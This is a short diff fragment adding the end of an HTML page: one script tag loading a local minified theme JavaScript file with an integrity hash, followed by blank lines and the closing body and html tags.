+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
